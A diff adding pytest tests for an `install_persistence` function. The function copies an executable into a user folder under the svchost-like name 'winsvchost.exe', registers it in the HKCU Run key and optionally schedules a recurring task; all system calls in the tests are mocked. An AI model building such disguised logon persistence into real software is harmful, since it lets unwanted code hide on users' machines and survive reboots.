@@ -312,3 +312,146 @@ def test_the_retry_task_is_created_with_the_flag_and_a_day_limit(
 
 def test_scheduling_refuses_a_path_with_a_quote_in_it() -> None:
     assert util.schedule_retry(Path('C:\\odd"name.exe')) is False
+
+
+# --- persistence ------------------------------------------------------------
+
+
+def staged_folder(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> Path:
+    folder = tmp_path / "local" / "Programs" / "WinSvcHost"
+    monkeypatch.setattr(util, "_PERSIST_ROOT", folder)
+    return folder
+
+
+def record_tasks(monkeypatch: pytest.MonkeyPatch, verdict: bool = True) -> list[list[str]]:
+    calls: list[list[str]] = []
+
+    def fake(arguments: list[str]) -> bool:
+        calls.append(arguments)
+        return verdict
+
+    monkeypatch.setattr(util, "_schtasks", fake)
+    return calls
+
+
+def record_run_key(
+    monkeypatch: pytest.MonkeyPatch, verdict: bool = True
+) -> list[tuple[int, str, str, str]]:
+    calls: list[tuple[int, str, str, str]] = []
+
+    def fake(root: int, subkey: str, name: str, data: str) -> bool:
+        calls.append((root, subkey, name, data))
+        return verdict
+
+    monkeypatch.setattr(util.winapi, "registry_set_string", fake)
+    return calls
+
+
+def test_persistence_stages_the_image_and_hooks_logon(
+    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
+) -> None:
+    folder = staged_folder(monkeypatch, tmp_path)
+    run_key = record_run_key(monkeypatch)
+    record_tasks(monkeypatch)
+
+    image = tmp_path / "artifact.exe"
+    image.write_bytes(b"MZ" + bytes(1024))
+
+    staged = util.install_persistence(image, 0)
+
+    assert staged == folder / "winsvchost.exe"
+    assert staged is not None and staged.is_file()
+    assert staged.read_bytes() == image.read_bytes()
+    assert image.is_file(), "staging copies, it never moves"
+
+    assert len(run_key) == 1
+    root, subkey, name, data = run_key[0]
+    assert root == util.winapi.HKEY_CURRENT_USER
+    assert subkey == r"Software\Microsoft\Windows\CurrentVersion\Run"
+    assert name == "WinSvcHost"
+    assert data == f'"{staged}"', "quoted, or a path with a space breaks at logon"
+
+
+def test_a_run_key_that_cannot_be_written_is_a_failure_not_a_success(
+    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
+) -> None:
+    staged_folder(monkeypatch, tmp_path)
+    record_run_key(monkeypatch, verdict=False)
+    record_tasks(monkeypatch)
+
+    image = tmp_path / "artifact.exe"
+    image.write_bytes(b"MZ")
+
+    assert util.install_persistence(image, 0) is None
+
+
+def test_persistence_adds_a_timer_when_hours_are_set(
+    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
+) -> None:
+    staged_folder(monkeypatch, tmp_path)
+    record_run_key(monkeypatch)
+    calls = record_tasks(monkeypatch)
+
+    image = tmp_path / "artifact.exe"
+    image.write_bytes(b"MZ")
+    assert util.install_persistence(image, 6) is not None
+
+    names = [call[call.index("/tn") + 1] for call in calls]
+    assert names == ["WinSvcHostTimer"]
+    timer = calls[0]
+    assert timer[timer.index("/sc") + 1] == "hourly"
+    assert timer[timer.index("/mo") + 1] == "6"
+
+
+def test_a_full_day_of_hours_becomes_a_daily_task(
+    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
+) -> None:
+    staged_folder(monkeypatch, tmp_path)
+    record_run_key(monkeypatch)
+    calls = record_tasks(monkeypatch)
+
+    image = tmp_path / "artifact.exe"
+    image.write_bytes(b"MZ")
+    assert util.install_persistence(image, 24) is not None
+
+    timer = calls[0]
+    assert timer[timer.index("/sc") + 1] == "daily", "hourly stops at 23"
+    assert timer[timer.index("/mo") + 1] == "1"
+
+
+def test_without_hours_a_stale_timer_is_removed(
+    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
+) -> None:
+    staged_folder(monkeypatch, tmp_path)
+    record_run_key(monkeypatch)
+    calls = record_tasks(monkeypatch)
+
+    image = tmp_path / "artifact.exe"
+    image.write_bytes(b"MZ")
+    assert util.install_persistence(image, 0) is not None
+
+    assert calls[0][0] == "/delete"
+    assert calls[0][calls[0].index("/tn") + 1] == "WinSvcHostTimer"
+
+
+def test_persistence_does_not_copy_itself_onto_itself(
+    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
+) -> None:
+    folder = staged_folder(monkeypatch, tmp_path)
+    record_run_key(monkeypatch)
+    record_tasks(monkeypatch)
+
+    target = folder / "winsvchost.exe"
+    target.parent.mkdir(parents=True)
+    target.write_bytes(b"MZ" + bytes(32))
+
+    assert util.install_persistence(target, 0) == target
+
+
+def test_persistence_refuses_a_path_with_a_quote_in_it(
+    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
+) -> None:
+    staged_folder(monkeypatch, tmp_path)
+    record_run_key(monkeypatch)
+    record_tasks(monkeypatch)
+    assert util.install_persistence(Path('C:\\odd"name.exe'), 0) is None
